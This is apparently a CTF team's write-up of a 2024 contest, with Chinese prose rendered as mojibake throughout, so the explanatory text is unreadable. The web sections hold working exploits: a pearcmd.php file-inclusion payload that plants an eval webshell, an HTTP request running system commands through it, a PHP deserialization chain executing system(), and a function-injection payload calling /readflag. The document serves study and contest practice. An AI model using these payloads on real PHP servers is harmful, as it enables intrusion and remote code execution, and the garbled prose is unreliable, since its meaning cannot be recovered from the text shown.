---
title: æ­¦åŠŸå±±æ¯åˆèµ›
date: 2024-7-25
categories: CTF
author: èµ›åšä¿å®‰
description: 'åˆèµ›åŠå¤©,è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„!'
cover: 'https://gitee.com/eviden/img/raw/master/202407260655025.png'
abbrlink: 5184866e
---

> date: 2024-7-25
>
> author/team: èµ›åšä¿å®‰

----

> é©´å‹å°é•‡

![image-20240725161345705](https://gitee.com/eviden/img/raw/master/202407251613026.png)

![image-20240725161424862](https://gitee.com/eviden/img/raw/master/202407251614114.png)

> é¾™æºªç§˜å¢ƒ

bpçˆ†ç ´å¾—åˆ°è´¦å·å¯†ç :
test:654321(ps:å¯†ç base64ç¼–ç )
![image-20240725161630181](https://gitee.com/eviden/img/raw/master/202407251616491.png)

>æ­¦åŠŸè®ºå‰‘

å¼€é¢˜æºç :

```php
<?php 
show_source(__FILE__);
if(isset($_GET['file'])){
    if(preg_match("/flag/i",$_GET['file'])){
        echo "no way";
    }
    else{
        $file=$_GET['file'];
        include_once($file);
    }
```

**pearcmdæ–‡ä»¶åŒ…å«**

æ‰‹å†™ä¸€ä¸ªğŸå­è¿›å»`?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[c]);?>+/tmp/shell.php`

ç„¶åè®¿é—®:

```
POST /source.php?file=/tmp/shell.php HTTP/1.1
Host: 59.62.61.30:45255
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

c=system("tac /flag");
```



![image-20240725162102201](https://gitee.com/eviden/img/raw/master/202407251621343.png)

> çŸ³èƒ½ä¸ºé¼“

```php
<?php
show_source(__FILE__);

class ping {
    protected $xiang;

    function __construct() {
        $this->xiang = new fun();
    }

    function __destruct() {
        $this->xiang->cp();
    }
}

class fun {
    function cp() {
        echo "hello";
    }
}

class cup {
    private $data;
    function cp() {
        eval($this->data);
    }
}

unserialize($_GET['d']);

```

ç®€ç®€å•å•ååºåˆ—åŒ–
EXP:

```php
<?php
class ping {
    protected $xiang;
    function __construct($xiang) {
        $this->xiang = $xiang;
    }
}

class cup {
    private $data;
    function __construct($data) {
        $this->data = $data;
    }
}

$cup = new cup("system('cat /fl*');");
$ping = new ping($cup);
echo urlencode(serialize($ping));

//O%3A4%3A%22ping%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00xiang%22%3BO%3A3%3A%22cup%22%3A1%3A%7Bs%3A9%3A%22%00cup%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D

```

> èæ°´ç›¸é€¢

è²Œä¼¼æ˜¯åŸé¢˜:
æœåˆ°é¢˜è§£,**æ‹¿æ¥ä¸»ä¹‰å’¯!**!

`https://fanygit.github.io/2021/08/22/[web]%E4%B8%80%E9%81%93TimelineSec%E5%9B%A2%E9%98%9F%E5%85%A5%E9%98%9F%E9%A2%98/`

EXP:**?code='input'('cmd')('input'('value'));&cmd=system&value=/readflag **  â€”â€”> æ‹¿èµ°!ä¸€æ­¥åˆ°ä½

> ä¹é¾™åæ°´

PWN é¢˜çœŸçš„æ°´å§å¯èƒ½,æœ‰ä¸”åªæœ‰ä¸€é¢˜,é˜Ÿé‡Œwebæ‰‹å†™çš„

![img](https://gitee.com/eviden/img/raw/master/202407251633494.png)

![img](https://gitee.com/eviden/img/raw/master/202407251633560.jpg)

> è‘›ä»™ç‚¼ä¸¹

**Mobile**

![image-20240725163741783](https://gitee.com/eviden/img/raw/master/202407251637841.png)

![image-20240725163759224](https://gitee.com/eviden/img/raw/master/202407251637296.png)

Apkæ–‡ä»¶ï¼Œç”¨jebæ‰“å¼€ï¼Œæœå…³é”®å­—ç¬¦ä¸²flagï¼Œçœ‹åˆ°checkflagå‡½æ•°ï¼Œå…³æ³¨åˆ°ä¸‹é¢æœ‰ä¸ªxor,å’Œä¸¤å †å­—ç¬¦ä¸²ï¼Œå°†ä»–ä»¬å¼‚æˆ–è¾“å‡ºä¸ºå­—ç¬¦å°±å¾—åˆ°flagäº†

![image-20240725163809147](https://gitee.com/eviden/img/raw/master/202407251638213.png)

![image-20240725163817127](https://gitee.com/eviden/img/raw/master/202407251638191.png)

> æ˜Ÿç©ºæ ˆé“

**MISC**

é¦–å…ˆæ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶å«base.txtï¼Œç„¶åç«‹åˆ»æƒ³åˆ°äº†baseè½¬å›¾ç‰‡ï¼Œè½¬äº†ä¹‹åï¼Œå‘ç°å›¾ç‰‡æŸåæ‰“ä¸å¼€ï¼Œç„¶åç”¨010æ‰“å¼€ï¼Œå‘ç°å…¶ä¸ºelfæ–‡ä»¶ï¼ŒæŠŠåç¼€æ”¹æˆelfï¼Œç”¨ida64æ‰“å¼€

![image-20240725164026673](https://gitee.com/eviden/img/raw/master/202407251640785.png)

å‘ç°å¾ªç¯å¼‚æˆ–å°±æ¬§å…‹äº†

> ä¹é¾™åæ°´

![image-20240725164048961](https://gitee.com/eviden/img/raw/master/202407251640049.png)

å…ˆå¾—10åˆ†æ‰¾åˆ°ï¼Œè®¡åˆ†çš„åœ°å€ï¼Œå°†åˆ†æ•°ä¿®æ”¹ä¸º10000000

![image-20240725164101191](https://gitee.com/eviden/img/raw/master/202407251641343.png)

> èŠ±ç‚®æ•…é‡Œ

æ‰“å¼€txt,æ ¹æ®æç¤ºpythonå¯çŸ¥ï¼Œæ–‡ä»¶ä¸ºpythonå­—èŠ‚ç ï¼Œå¤§è‡´æ„æ€å°±æ˜¯ï¼Œè¾“å…¥flag,å­˜åˆ°flaglisté‡Œé¢ï¼Œç„¶åå¯¹æ¯”flaglistçš„é•¿åº¦å’Œå·²çŸ¥æ•°ç»„ressçš„é•¿åº¦ï¼Œä¸ä¸€æ ·å°±é€€å‡ºï¼Œç„¶ååˆ¤æ–­flaglisté‡Œçš„æ•°åŠ 3ï¼Œç„¶åå¼‚æˆ–152æ˜¯ä¸æ˜¯ç­‰äºressï¼Œå¦‚æœç­‰äºå°±è¾“å‡ºsuccessï¼Œè§£å¯†åªè¦å°†ressé‡Œçš„æ•°å¼‚æˆ–152ï¼Œå†å‡3å³å¯

![image-20240725164139491](https://gitee.com/eviden/img/raw/master/202407251641553.png)

![image-20240725164157302](https://gitee.com/eviden/img/raw/master/202407251641379.png)

> é¾™é³çŸ³é˜¶

æ‰“å¼€æµé‡åŒ…ï¼Œæ‰¾åˆ°dnséƒ¨åˆ†ï¼Œçœ‹åˆ°ä¸€äº›base+......çš„å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä¸ºbase64è§£å¯†ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œç”¨æœ€åå‡ ä¸ªå¯ä»¥è§£å‡ºflag

![image-20240725164216963](https://gitee.com/eviden/img/raw/master/202407251642075.png)

> é‡‘é¡¶ç»å¢ƒ

é¦–å…ˆæŸ¥å£³ï¼Œå‘ç°64æ— å£³

å‘ç°ä¸€å †å­—ç¬¦ä¸²å’Œbase64ç è¡¨

![image-20240725164248724](https://gitee.com/eviden/img/raw/master/202407251642798.png)

çŒœæµ‹ä¸ºbase64åŠ å¯†

è½¬ä¸ºå­—ç¬¦ä¸²å‘ç°ä¸ºZmxhå¼€å¤´,æ›´åŠ è‚¯å®šäº†çŒœæƒ³

![image-20240725164302689](https://gitee.com/eviden/img/raw/master/202407251643763.png)

Base64è§£ç å¾—åˆ°flag

> é“è¹„å…³éš˜

**é“å…·é¢˜**

![image-20240725170452378](https://gitee.com/eviden/img/raw/master/202407251704502.png)

![img](https://gitee.com/eviden/img/raw/master/202407251705771.png)